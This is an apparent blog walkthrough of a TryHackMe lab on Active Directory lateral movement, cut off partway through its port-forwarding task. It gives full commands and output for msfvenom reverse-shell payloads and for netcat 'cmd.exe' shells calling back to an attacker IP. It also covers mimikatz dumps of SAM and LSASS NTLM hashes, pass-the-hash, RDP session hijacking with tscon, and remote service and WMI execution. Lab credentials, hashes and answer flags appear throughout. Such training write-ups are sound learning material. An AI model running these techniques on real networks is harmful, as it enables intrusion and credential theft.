---
id: 629
title: "TryHackMe Lateral Movement and Pivoting Walk-through"
created: 2023-10-21T13:35:35+00:00
url: https://hacklido.com/blog/629-tryhackme-lateral-movement-and-pivoting-walk-through
words: 5265
---

# TryHackMe Lateral Movement and Pivoting Walk-through

[image]

This network is part three to the sequel active directory networks. If you want to check out  https://hacklido.com/blog/626-breaching-ad-tryhackme-writeup part1, and  https://hacklido.com/blog/627-enumerating-active-directory-tryhackme-walkthrough part2 please click on the links to visit them. Now as usual let’s connect to the network

Room URL 🚪 –>  https://tryhackme.com/room/lateralmovementandpivoting https://tryhackme.com/room/lateralmovementandpivoting

# Task 1  Introduction 🐧

Configure the attackbox `DNS` using the following commands

```
`root@mccleod1290:~#  systemd-resolve --interface lateralmovement --set-dns 10.200.104.101 --set-domain za.tryhackme.com
root@mccleod1290:~# nslookup za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	za.tryhackme.com
Address: 10.200.104.101`
```

Now in the earlier networks we would SSH Into the machine with the credentials given on distributer website and don’t try any other username:password pair to ssh into the machine, each task has it’s own username and password and it’s better to stick as this machine was intended to pwned only in this manner.

# Task 2  Moving Through the Network 🐯

No answers are needed, just read and go through the task material

# Task 3 Spawning Processes Remotely 🐭

Step 1 - SSH into the machine with the following credentials `t1_leonard.summers:EZpass4ever`

```
`
root@mccleod1290:~# ssh za\\t1_leonard.summers@thmjmp2.za.tryhackme.com
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.104.249)' can't be established.
ECDSA key fingerprint is SHA256:mKpbr9DhO6i956GwbTAxqxfZnag5vDfb3u9I7LeD//o.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com,10.200.104.249' (ECDSA) to the list of known hosts.
za\t1_leonard.summers@thmjmp2.za.tryhackme.com's password:

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.`
```

Step 2 - Create msf payload, upload on the remote system using `smb`.

```
`root@mccleod1290:~# msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=lateralmovement LPORT=4444 -o myservice.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe-service file: 15872 bytes
Saved as: myservice.exe
root@mccleod1290:~#  smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
WARNING: The "syslog" option is deprecated
putting file myservice.exe as \myservice.exe (344.4 kb/s) (average 344.4 kb/s)`
```

Step 3- Do remember to start two reverse shell listeners, one will be msf reverse shell listener running on port `4444` for getting `nt authority\system` and run normal `netcat` listener for port `4443` to get normal user’s reverse shell.

Terminal one

```
`root@mccleod1290:~#  msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/shell/reverse_tcp
LHOST => lateralmovement
LPORT => 4444
[*] Started reverse TCP handler on 10.50.100.146:4444`
```

Terminal two

```
`nc -nlvp 4443`
```

Step 4 - Get normal user shell by executing `runas` binary in the first machine to whom we got `ssh` access. This should give you reverse shell in the second terminal which is listening on port `4443`.

```
`za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>runas /ne
tonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe
-e cmd.exe 10.50.100.146 4443"
Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:
Attempting to start c:\tools\nc64.exe -e cmd.exe 10.50.100.146 4443
 as user "ZA.TRYHACKME.COM\t1_leonard.summers" ...  `
```

Step 5- On the second terminal execute the following commands to trigger our `msfpayload` once again so that we get `nt authority\system` access on the listener to which our first terminal is listening.

```
`root@mccleod1290:~# nc -nlvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from 10.200.104.249 50158 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
[SC] CreateService FAILED 1073:

The specified service already exists.

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249

SERVICE_NAME: THMservice-3249
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1180
        FLAGS              :

C:\Windows\system32>`
```

Step 6 - Now you should have gotten shell. Just look around and you should get the flag in `C:\Users\t1_leonard.summers\Desktop>`.

```
`root@mccleod1290:~#  msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/shell/reverse_tcp
LHOST => lateralmovement
LPORT => 4444
[*] Started reverse TCP handler on 10.50.100.146:4444
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.200.104.201
[*] Command shell session 1 opened (10.50.100.146:4444 -> 10.200.104.201:63071) at 2023-10-21 10:17:37 +0100

Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>cd Users/
cd Users/

C:\Users>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users

2022/06/15  17:31    <DIR>          .
2022/06/15  17:31    <DIR>          ..
2022/02/27  11:45    <DIR>          .NET v2.0
2022/02/27  11:45    <DIR>          .NET v2.0 Classic
2022/02/27  11:45    <DIR>          .NET v4.5
2022/02/27  11:45    <DIR>          .NET v4.5 Classic
2022/02/28  22:15    <DIR>          Administrator
2022/04/30  08:41    <DIR>          Administrator.ZA
2022/02/27  11:45    <DIR>          Classic .NET AppPool
2020/03/21  21:25    <DIR>          Public
2022/03/06  19:53    <DIR>          svcFileCopy
2022/04/27  17:34    <DIR>          t1_corine.waters
2022/04/27  17:27    <DIR>          t1_leonard.summers
2022/06/15  17:31    <DIR>          t1_thomas.moore
2022/04/27  17:46    <DIR>          t1_toby.beck
2022/03/20  15:54    <DIR>          vagrant
               0 File(s)              0 bytes
              16 Dir(s)  46\ufffd554\ufffd959\ufffd872 bytes free

C:\Users>cd t1_leonard.summers
cd t1_leonard.summers

C:\Users\t1_leonard.summers>cd Desktop
cd Desktop

C:\Users\t1_leonard.summers\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\t1_leonard.summers\Desktop

2022/06/17  18:41    <DIR>          .
2022/06/17  18:41    <DIR>          ..
2022/06/17  18:40            58\ufffd368 Flag.exe
               1 File(s)         58\ufffd368 bytes
               2 Dir(s)  46\ufffd554\ufffd959\ufffd872 bytes free

C:\Users\t1_leonard.summers\Desktop>.\Flag.exe
.\Flag.exe
THM{MOVING_WITH_SERVICES}

C:\Users\t1_leonard.summers\Desktop>`
```

Questions

After running the “flag.exe” file on t1_leonard.summers desktop on THMIIS, what is the flag?

```
`THM{MOVING_WITH_SERVICES}`
```

# Task 4  Moving Laterally Using WMI 🐸

To get the flag in this task you have to follow just two steps.

Step 1 - Create msf payload and then and upload it to the machine using `smb` and start reverse shell listener.

```
`
root@mccleod1290:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes

root@mccleod1290:~# smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
WARNING: The "syslog" option is deprecated
putting file myinstaller.msi as \myinstaller.msi (2328.4 kb/s) (average 2328.4 kb/s)
root@mccleod1290:~# msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/shell/reverse_tcp
LHOST => lateralmovement
LPORT => 4445
[*] Started reverse TCP handler on 10.50.100.146:4445`
```

Step 2 - On the machine to which you have got `ssh` , start `powershell`, create an `wmi session` using 6 powershell commands and then finally invoke the `payload` so that it connects back to our system.

```
`za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>cd ..

za\t1_leonard.summers@THMJMP2 C:\Users>cd ..

za\t1_leonard.summers@THMJMP2 C:\>powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;

PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

ReturnValue PSComputerName
----------- --------------
       1603 thmiis.za.tryhackme.com

PS C:\>   `
```

Now search through the system to get flag. You should have received your reverse shell connection by now if you have done everything correctly. `Flag.exe` should be located at `C:\Users\t1_corine.waters\Desktop>`.

Questions

After running the “flag.exe” file on t1_corine.waters desktop on THMIIS, what is the flag?

```
`THM{MOVING_WITH_WMI_4_FUN}`
```

# Task 5  Use of Alternate Authentication Material 🦁

Now we can solve this task using different attacks such as `pass-the-hash`, `pass-the-ticket`, `pass-the-key` but since this is quite a lot of work to document and write, our focus will be on to get the flag using one single method which is `pass-the-hash`. Now if you readers want to see other methods please do let me know in the comments.

## Pass-the-Hash

Step 1 - Login to the machine and ‘Extract’ NTLM hashes from local SAM:

Credentials are `t2_felicia.dean:iLov3THM!`

```
`root@mccleod1290:~# ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
za\t2_felicia.dean@thmjmp2.za.tryhackme.com's password:

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.               `
```

Step 2 - Go to the directory which has `mimikatz`

Under `C:\tools` we have `mimikatz` file which we will be using extensively to complete this task.

```
`za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>cd ..

za\t2_felicia.dean@THMJMP2 C:\Users>cd ..

za\t2_felicia.dean@THMJMP2 C:\>cd Tools

za\t2_felicia.dean@THMJMP2 C:\tools>dir
 Volume in drive C has no label.
 Volume Serial Number is F4B0-FCB9

 Directory of C:\tools

06/22/2022  03:04 PM    <DIR>          .
06/22/2022  03:04 PM    <DIR>          ..
08/10/2021  03:22 PM         1,355,680 mimikatz.exe
06/14/2022  08:27 PM            45,272 nc64.exe
04/19/2022  09:17 PM         1,078,672 PsExec64.exe
03/16/2022  05:19 PM           906,752 SharpHound.exe
06/19/2022  05:38 AM    <DIR>          socat
               4 File(s)      3,386,376 bytes
               3 Dir(s)   9,167,261,696 bytes free                 `
```

Step 3 - Run `mimikatz` with enough privileges.

Execute the file, and give it out necessary privileges to execute and run !

```
`za\t2_felicia.dean@THMJMP2 C:\tools>mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.
com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail
.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.co
m ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

504     {0;000003e7} 1 D 16860          NT AUTHORITY\SYSTEM     S-1
-5-18   (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;002fd1bc} 0 D 3138572     ZA\t2_felicia.dean
S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p)       Pri
mary
 * Thread Token  : {0;000003e7} 1 D 3192122     NT AUTHORITY\SYSTEM
        S-1-5-18        (04g,21p)       Impersonation (Delegation) `
```

Step 4- Extract NTLM hashes from local SAM:[optional]

```
`mimikatz # lsadump::sam
Domain : THMJMP2
SysKey : 2e27b23479e1fb1161a839f9800119eb
Local SID : S-1-5-21-1946626518-647761240-1897539217

SAMKey : 9a74a253f756d6b012b7ee3d0436f77a

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount `
```

Step 5- Extract NTLM hashes from LSASS memory:

```
`mikatz # sekurlsa::msv

Authentication Id : 0 ; 3133116 (00000000:002fcebc)
Session           : Service from 0
User Name         : sshd_6324
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 10/21/2023 10:26:23 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638
107-1125189541-6324
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 934599 (00000000:000e42c7)
Session           : RemoteInteractive from 7
User Name         : t1_toby.beck3
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 9:11:00 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4618
        msv :
         [00000003] Primary
         * Username : t1_toby.beck3
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 20fa99221aff152851ce37bcd510e61e

Authentication Id : 0 ; 928722 (00000000:000e2bd2)
Session           : Interactive from 7
User Name         : DWM-7
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:59 AM
SID               : S-1-5-90-0-7
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 845094 (00000000:000ce526)
Session           : RemoteInteractive from 6
User Name         : t1_toby.beck2
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 9:10:49 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4617
        msv :
         [00000003] Primary
         * Username : t1_toby.beck2
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 4350e787e87478881a14c357350ffb6e

Authentication Id : 0 ; 839289 (00000000:000cce79)
Session           : Interactive from 6
User Name         : DWM-6
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:48 AM
SID               : S-1-5-90-0-6
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 752676 (00000000:000b7c24)
Session           : RemoteInteractive from 5
User Name         : t1_toby.beck1
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 9:10:38 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4616
        msv :
         [00000003] Primary
         * Username : t1_toby.beck1
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 489fed8eeb5acc4ffb205663491b62d3

Authentication Id : 0 ; 747275 (00000000:000b670b)
Session           : Interactive from 5
User Name         : DWM-5
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:37 AM
SID               : S-1-5-90-0-5
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 663149 (00000000:000a1e6d)
Session           : RemoteInteractive from 4
User Name         : t1_toby.beck
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 9:10:27 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4607
        msv :
         [00000003] Primary
         * Username : t1_toby.beck
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : d9cd92937c7401805389fbb51260c45f

Authentication Id : 0 ; 656495 (00000000:000a046f)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:27 AM
SID               : S-1-5-90-0-4
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 396794 (00000000:00060dfa)
Session           : RemoteInteractive from 3
User Name         : t1_toby.beck5
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 9:01:36 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4620
        msv :
         [00000003] Primary
         * Username : t1_toby.beck5
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 0537b9105954f5d1d1bc2f1763d86fd6

Authentication Id : 0 ; 391029 (00000000:0005f775)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:01:35 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 391005 (00000000:0005f75d)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:01:35 AM
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 304223 (00000000:0004a45f)
Session           : RemoteInteractive from 2
User Name         : t1_toby.beck4
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 9:01:25 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4619
        msv :
         [00000003] Primary
         * Username : t1_toby.beck4
         * Domain   : ZA
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38
         * DPAPI    : 47d511de8e208dc0053e88223dcdd31c

Authentication Id : 0 ; 287656 (00000000:000463a8)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:01:24 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 42521 (00000000:0000a619)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:51 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : THMJMP2$
Domain            : ZA
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:51 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 22069 (00000000:00005635)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:51 AM
SID               :
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 3133884 (00000000:002fd1bc)
Session           : NetworkCleartext from 0
User Name         : t2_felicia.dean
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 10/21/2023 10:26:32 AM
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : t2_felicia.dean
         * Domain   : ZA
         * NTLM     : 7806fea66c81806b5dc068484b4567f6
         * SHA1     : b5c06a36f629a624e4adce09bd59e5f99c90a9a7
         * DPAPI    : e375158311db4a6357c3e3921cd42e7e

Authentication Id : 0 ; 928747 (00000000:000e2beb)
Session           : Interactive from 7
User Name         : DWM-7
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:59 AM
SID               : S-1-5-90-0-7
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 839264 (00000000:000cce60)
Session           : Interactive from 6
User Name         : DWM-6
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:48 AM
SID               : S-1-5-90-0-6
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 747296 (00000000:000b6720)
Session           : Interactive from 5
User Name         : DWM-5
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:37 AM
SID               : S-1-5-90-0-5
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 656470 (00000000:000a0456)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:10:27 AM
SID               : S-1-5-90-0-4
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 287631 (00000000:0004638f)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 9:01:24 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 103031 (00000000:00019277)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:53 AM
SID               : S-1-5-80-1184457765-4068085190-3456807688-22009
52327-3769537534
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:53 AM
SID               : S-1-5-17
        msv :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:51 AM
SID               : S-1-5-19
        msv :

Authentication Id : 0 ; 42483 (00000000:0000a5f3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:51 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : THMJMP2$
         * Domain   : ZA
         * NTLM     : b1c78e9ff9eefd5eb39f2170ba8191d7
         * SHA1     : c54bef0e876767a393acf664c3b3ab4096d075f5

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : THMJMP2$
Domain            : ZA
Logon Server      : (null)
Logon Time        : 10/21/2023 8:59:51 AM
SID               : S-1-5-18
        msv :

mimikatz #  `
```

Note that we are expected to get flag.exe from `t1_toby.beck` so let’s grab his hash from the output and perform `passthehash` attack. In our case his `NTLM` has would be `533f1bd576caa912bdb9da284bbc60fe` . Now let’s run the command and make sure that reverse shell is listening to port `5555` on another terminal.

Step 6 - Get the shell

```
`mimikatz # token::revert
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.100.146 5555"`
```

 `Flag.exe` should be located at `C:\Users\t1_toby.beck\Desktop>`.

Questions

What is the flag obtained from executing “flag.exe” on t1_toby.beck’s desktop on THMIIS?

```
`THM{MOVING_WITH_WMI_4_FUN}`
```

# Task 6  Abusing User Behavior 🐨

Credentials for this task are `t2_kelly.blake:8LXuPeNHZFFG` and use `xfreerdp` with `+clipboard` option to enable clipboard.

Step 1 - RDP into the machine

```
`xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG +clipboard`
```

Step 2 - Go to the `C:\tools` and run `PsExec64.exe` and make sure that `cmd` is running with administrator access.

```
`
C:\tools>PsExec64.exe -s cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.`
```

Step 3 - Use query user to see id and state of each user and make note of the username `t1_toby.beck` and it’s `sessionname` and `id`. And do remember it’s different for each user !!

```
`C:\Windows\system32>query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 t1_toby.beck3                             2  Disc            1  10/21/2023 11:38 AM
 t1_toby.beck4                             3  Disc            .  10/21/2023 11:38 AM
 t1_toby.beck5                             4  Disc            .  10/21/2023 11:38 AM
 t1_toby.beck                              5  Disc            1  10/21/2023 11:46 AM
 t1_toby.beck1                             6  Disc            1  10/21/2023 11:47 AM
 t1_toby.beck2                             7  Disc            1  10/21/2023 11:47 AM
 t2_kelly.blake        rdp-tcp#10          8  Active          .  10/21/2023 11:47 AM`
```

Step 4 - To get the flag simply type in

```
`C:\Windows\system32>tscon 5 /dest:rdp-tcp#10

[center]  [upl-image-preview url=https://hacklido.com/assets/files/2023-10-21/1697895263-860209-image.png]
   [/center]

-------------

# Task 7  Port Forwarding 🐺

Let's break down this room. First and foremost you will be forward ports using `ssh tunnelling` and for this you will be using `socat`. There are `2 flags` in this task.

To get first flag, personal `ssh tunnelling` on victim machine using `socat` and `rdp ` into the machine and you will get the flag ! sounds simple and easy right??

First let's log into the windows machine using the following credentials `t1_thomas.moore:MyPazzw3rd2020`

```bash
root@mccleod1290:~# clear

root@mccleod1290:~# ssh za\\t1_thomas.moore@thmjmp2.za.tryhackme.com
za\t1_thomas.moore@thmjmp2.za.tryhackme.com's password:

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.               `
```

Step 1 - Go to `C:\tools\socat` and tunnel your network traffic to port `13389`.

```
`
za\t1_thomas.moore@THMJMP2 C:\Users\t1_thomas.moore>cd ..

za\t1_thomas.moore@THMJMP2 C:\Users>cd ..

za\t1_thomas.moore@THMJMP2 C:\>cd tools

.

za\t1_thomas.moore@THMJMP2 C:\tools>dir
 Volume in drive C has no label.
 Volume Serial Number is F4B0-FCB9

 Directory of C:\tools

06/22/2022  03:04 PM    <DIR>          .
06/22/2022  03:04 PM    <DIR>          ..
08/10/2021  03:22 PM         1,355,680 mimikatz.exe
06/14/2022  08:27 PM            45,272 nc64.exe
04/19/2022  09:17 PM         1,078,672 PsExec64.exe
03/16/2022  05:19 PM           906,752 SharpHound.exe
